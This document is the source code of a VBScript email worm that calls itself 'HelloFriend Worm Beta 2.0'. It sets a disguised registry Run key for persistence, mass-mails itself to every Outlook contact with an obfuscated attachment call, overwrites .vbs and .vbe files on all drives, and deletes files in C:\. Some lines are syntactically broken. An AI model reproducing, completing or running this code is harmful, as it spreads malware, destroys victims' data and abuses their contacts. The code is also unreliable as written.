#HelloFriend Worm Beta 2.0, looks like you found the code huh? well then welcome to HFW Beta 2.0!
Set UT5128J4 = createobject("scripting.filesystemobject")
V6743BR6 = UT5128J4.getspecialfolder(0)
HFNN3A74 = V6743BR6 & "\hello_friend.txt.vbs"
Set KGB67V51 = createobject("wscript.shell")
KGB67V51.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & HFNN3A74 & " %"
UT5128J4.copyfile wscript.scriptfullname, HFNN3A74
If KGB67V51.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\HelloFriend\EIJDV762") <> 1 then
E0866IPG
End if

Function E0866IPG()
Set Q5P4TRMU = CreateObject("Outlook.Application")
If Q5P4TRMU = "Outlook" Then
Set JI61J6TQ = Q5P4TRMU.GetNameSpace("MAPI")
Set NS17C753 = JI61J6TQ.AddressLists
For Each VB16GR61 In NS17C753
If VB16GR61.AddressEntries.Count <> 0 Then
S5C2492P = VB16GR61.AddressEntries.Count
For RRS8K9AR = 1 To S5C2492P
Set H22PKNT4 = Q5P4TRMU.CreateItem(0)
Set FI632899 = VB16GR61.AddressEntries(RRS8K9AR)
H22PKNT4.To = FI632899.Address
H22PKNT4.Subject = "HelloFriend"
H22PKNT4.Body = "Hello there my dear friend." & vbcrlf & "Kindly open the attachment, please dont make me upset and open it."
execute "set JDCN28FV =H22PKNT4." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
K1C7B5U1 = HFNN3A74
H22PKNT4.DeleteAfterSubmit = True
JDCN28FV.Add K1C7B5U1
If H22PKNT4.To <> "" Then
H22PKNT4.Send
End If
Next
End If
Next
End If
End function
Function G71G645V()
On Error Resume Next
Set A4H3V9EK = UT5128J4.Drives
For Each E3R1O676 In A4H3V9EK
SD1KTU6R = E3R1O676 & " \ "
Call QFP554M8(SD1KTU6R)
Next
End Function

Function QFP554M8(QEP3IF1E)
G251IPCR = QEP3IF1E
Set VGN79U5T = UT5128J4.GetFolder(G251IPCR)
Set DPQ47IV9 = VGN79U5T.Files
For Each KV53ROP7 In DPQ47IV9
If UT5128J4.GetExtensionName(KV53ROP7.path) = "vbs"
UT5128J4.CopyFile wscript.scriptfullname,KV53ROP7.path,true
End if
If UT5128J4.GetExtensionName(KV53ROP7.path) = "vbe"
UT5128J4.CopyFile wscript.scriptfullname,KV53ROP7.path,true
End if
Next
Set HJ5236DM = VGN79U5T.Subfolders
For Each BP19167V In HJ5236DM
Call (BP19167V.path)
Next

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFolder = objFSO.GetFolder("C:\")
For Each objFile In objFolder.Files
    objFile.Delete(True)
Next
End function
